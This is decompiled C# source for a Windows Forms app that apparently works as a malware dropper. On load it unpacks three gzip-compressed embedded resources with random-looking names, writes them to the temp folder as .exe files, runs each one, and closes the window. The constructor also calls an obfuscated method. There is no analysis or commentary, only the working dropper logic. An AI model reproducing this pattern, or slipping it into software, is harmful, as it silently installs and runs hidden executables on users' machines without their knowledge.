using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Windows.Forms;
using WindowsFormsApp1.Properties;

namespace WindowsFormsApp1;

public class Form1 : Form
{
	private IContainer components;

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		components = new Container();
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_Text("Form1");
		((Form)this).add_Load((EventHandler)Form1_Load);
	}

	public Form1()
	{
		Class2.yNfHDGRzxiuFT();
		((Form)this)._002Ector();
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		string text = Path.Combine(Path.GetTempPath(), "Doomr.exe");
		File.WriteAllBytes(text, Decompress(Resources.Doomr));
		Process.Start(text);
		string text2 = Path.Combine(Path.GetTempPath(), "Nsbsjemcjq.exe");
		File.WriteAllBytes(text2, Decompress(Resources.Nsbsjemcjq));
		Process.Start(text2);
		string text3 = Path.Combine(Path.GetTempPath(), "Ickhgnukmd.exe");
		File.WriteAllBytes(text3, Decompress(Resources.Ickhgnukmd));
		Process.Start(text3);
		((Form)this).Close();
	}

	private byte[] Decompress(byte[] input)
	{
		using MemoryStream memoryStream = new MemoryStream(input);
		byte[] array = new byte[4];
		memoryStream.Read(array, 0, 4);
		int num = BitConverter.ToInt32(array, 0);
		using GZipStream gZipStream = new GZipStream(memoryStream, CompressionMode.Decompress);
		byte[] array2 = new byte[num];
		gZipStream.Read(array2, 0, num);
		return array2;
	}
}
